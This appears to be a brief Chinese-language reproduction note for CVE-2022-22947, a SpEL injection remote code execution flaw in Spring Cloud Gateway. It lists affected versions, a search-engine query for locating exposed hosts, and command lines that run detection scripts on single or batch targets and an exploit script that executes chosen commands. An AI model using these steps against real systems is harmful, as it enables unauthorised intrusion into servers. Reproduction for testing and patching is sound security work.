
Spring Cloud Gateway远程代码执行漏洞复现(CVE-2022-22947)
Spring Cloud Gateway是Spring中的一个API网关。其3.1.0及3.0.6版本（包含）以前存在一处SpEL表达式注入漏洞，当攻击者可以访问ActuatorAPI的情况下，将可以利用该漏洞执行任意命令。
3.1.0、 3.0.0至3.0.6、 3.0.0之前的版本
app="vmware-SpringBoot-framework"

单个检测：python3 .\CVE-2022-22947-POC.py -t "http://0.0.0.0:1234"
批量检测：python3 .\CVE-2022-22947.py-POC -f "url.txt"

漏洞利用：python3 .\CVE-2022-22947-EXP.py -t "http://0.0.0.0:1234" -c  "cmd"

